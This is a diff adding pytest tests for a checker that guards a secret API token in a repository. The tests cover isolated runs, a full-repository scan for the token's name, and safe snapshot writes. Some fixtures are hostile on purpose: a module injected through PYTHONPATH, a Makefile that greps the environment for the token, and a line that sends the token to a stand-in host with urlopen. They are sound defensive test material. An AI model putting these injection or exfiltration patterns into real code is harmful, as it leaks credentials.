@@ -1827,3 +1827,193 @@ def test_snapshot_never_overwrites_or_follows_a_link(tmp_path: Path) -> None:
         check.write_new_file(link, "new")
     assert not (tmp_path / "elsewhere.json").exists()
     assert sorted(p.name for p in tmp_path.iterdir()) == ["link.json", "old.json"]
+
+
+# --- round 6: isolated run, full-repository scan, narrow test exemption -------
+
+NAME = check.TOKEN_ENV
+CHECKER = REPO / "scripts" / "check-edge.py"
+
+
+def run_checker(
+    tmp_path: Path, args: list[str], isolated: bool, env: dict[str, str]
+) -> subprocess.CompletedProcess[str]:
+    import sys
+
+    cmd = [sys.executable] + (["-I"] if isolated else []) + [str(CHECKER), *args]
+    return subprocess.run(  # noqa: S603
+        cmd, capture_output=True, text=True, env=env, cwd=tmp_path, timeout=60
+    )
+
+
+def hostile_env(tmp_path: Path) -> dict[str, str]:
+    steal = tmp_path / "steal"
+    steal.mkdir()
+    (steal / "json.py").write_text(
+        f"open({str(tmp_path / 'stolen')!r}, 'w').write('ran')\nraise RuntimeError\n"
+    )
+    return {"PYTHONPATH": str(steal), NAME: "secret", "PATH": "/usr/bin:/bin"}
+
+
+def test_a_non_isolated_run_is_refused_before_any_injected_module_runs(
+    tmp_path: Path,
+) -> None:
+    result = run_checker(
+        tmp_path, ["--live", "--zone-id", "0" * 32], False, hostile_env(tmp_path)
+    )
+    assert result.returncode == 2
+    assert "python3 -I" in result.stderr
+    assert not (tmp_path / "stolen").exists()
+    assert "secret" not in result.stdout + result.stderr
+
+
+def test_an_isolated_run_ignores_pythonpath(tmp_path: Path) -> None:
+    result = run_checker(tmp_path, ["--offline"], True, hostile_env(tmp_path))
+    assert result.returncode == 0, result.stderr
+    assert not (tmp_path / "stolen").exists()
+
+
+def test_the_entry_point_shebang_is_isolated() -> None:
+    assert CHECKER.read_text().splitlines()[0] == "#!/usr/bin/env -S python3 -I"
+
+
+def scan(root: Path, rel: str, data: bytes) -> list[str]:
+    path = root / rel
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_bytes(data)
+    return [p for p in check.repo_handoff_problems(root) if rel in p]
+
+
+@pytest.mark.parametrize(
+    ("rel", "data"),
+    [
+        ("pkg/node_modules/x.py", f"x = {NAME}\n".encode()),  # skipped dir, nested
+        ("pkg/venv/run", f"echo {NAME}\n".encode()),
+        ("a/b/thing.weird", f"{NAME}\n".encode()),  # unusual suffix
+        ("Makefile", f"leak:\n\tenv | grep {NAME}\n".encode()),  # no suffix, no shebang
+        ("blob.bin", b"\xff\xfe\x00" + NAME.encode() + b"\xff"),  # not UTF-8
+        ("big.py", b"A" * 3_000_000 + NAME.encode()),  # past any old size limit
+    ],
+)
+def test_the_handoff_scan_has_no_suffix_depth_or_size_evasion(
+    root: Path, rel: str, data: bytes
+) -> None:
+    assert scan(root, rel, data), rel
+
+
+def test_the_handoff_scan_finds_a_name_split_across_read_chunks(
+    root: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.setattr(check, "SCAN_CHUNK", 7)
+    assert scan(root, "odd/file", b"A" * 5 + NAME.encode() + b"B")
+
+
+def test_the_handoff_scan_follows_a_symlink_to_a_document(root: Path) -> None:
+    (root / "docs").mkdir()
+    (root / "docs" / "notes.md").write_text(f"echo {NAME}\n")
+    (root / "bin").mkdir()
+    (root / "bin" / "run").symlink_to(root / "docs" / "notes.md")
+    assert [p for p in check.repo_handoff_problems(root) if "bin/run" in p]
+    assert not [p for p in check.repo_handoff_problems(root) if "notes.md" in p]
+
+
+def test_the_handoff_scan_refuses_a_symlink_it_cannot_scan(
+    root: Path, tmp_path_factory: pytest.TempPathFactory
+) -> None:
+    outside = tmp_path_factory.mktemp("outside") / "f"
+    outside.write_text("x")
+    (root / "out").symlink_to(outside)
+    (root / "dangling").symlink_to(root / "missing")
+    problems = check.repo_handoff_problems(root)
+    assert any(p.startswith("out:") for p in problems)
+    assert any(p.startswith("dangling:") for p in problems)
+
+
+def test_the_handoff_scan_skips_ignored_directories_only_at_the_root(
+    root: Path,
+) -> None:
+    assert not scan(root, "node_modules/x.py", f"{NAME}\n".encode())
+    assert not scan(root, "docs/a.txt", f"{NAME}\n".encode())
+    assert not scan(root, "scripts/__pycache__/x.pyc", NAME.encode())
+
+
+def test_the_real_test_file_passes_its_own_narrow_exemption() -> None:
+    assert check.fixture_file_problem(Path(__file__)) is None
+    assert check.repo_handoff_problems(REPO) == []
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        f"import os\nos.environ[{NAME!r}]\n",
+        f"import os\nos.getenv({NAME!r})\n",
+        f"urlopen('https://x.invalid/?' + os.environ[{NAME!r}])\n",
+        f"{NAME} = 1\n",
+        f"x.{NAME}\n",
+        "def broken(:\n",
+    ],
+)
+def test_the_test_file_exemption_does_not_cover_real_use(root: Path, body: str) -> None:
+    problems = scan(root, check.TOKEN_TEST_FILE, body.encode())
+    assert problems, body
+
+
+def test_the_test_file_may_hold_the_name_inside_a_longer_fixture_string(
+    root: Path,
+) -> None:
+    body = f"FIXTURE = 'x = os.environ[\"{NAME}\"]'\n"
+    assert not scan(root, check.TOKEN_TEST_FILE, body.encode())
+
+
+def test_a_failed_temp_cleanup_after_install_is_not_a_failed_save(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    target = tmp_path / "snap.json"
+
+    def denied(path: Any) -> None:
+        raise OSError(13, "cleanup denied")
+
+    real_unlink = check.os.unlink
+    monkeypatch.setattr(check.os, "unlink", denied)
+    leftover = check.write_new_file(target, '{"a": 1}')
+    monkeypatch.setattr(check.os, "unlink", real_unlink)
+    assert target.read_text() == '{"a": 1}'
+    assert leftover is not None and Path(leftover).name.startswith(".snapshot-")
+    # the retry is refused cleanly because the snapshot is already there
+    with pytest.raises(FileExistsError):
+        check.write_new_file(target, "other")
+
+
+def test_live_reports_a_leftover_temp_name_as_a_warning_not_a_failure(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    monkeypatch.setenv(NAME, SENTINEL)
+    monkeypatch.setattr(check, "offline_problems", lambda root: [])
+    monkeypatch.setattr(check, "write_new_file", lambda p, t: "/x/.snapshot-abc")
+    desired = check.load_desired()
+
+    def api(path: str, token: str) -> dict[str, Any]:
+        return {"rules": []} if "rulesets" in path else dict(desired["bot_management"])
+
+    monkeypatch.setattr(check, "api_result", api)
+    check.main(["--live", "--zone-id", "0" * 32, "--save", str(tmp_path / "s.json")])
+    err = capsys.readouterr().err
+    assert "snapshot saved" in err and SENTINEL not in err
+    assert "cannot save" not in err
+
+
+def test_the_snapshot_directory_is_synced_after_the_link(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    synced: list[int] = []
+    real = check.os.fsync
+
+    def recording(fd: int) -> None:
+        synced.append(fd)
+        real(fd)
+
+    monkeypatch.setattr(check.os, "fsync", recording)
+    check.write_new_file(tmp_path / "s.json", "{}")
+    assert len(synced) == 2  # the file, then its directory
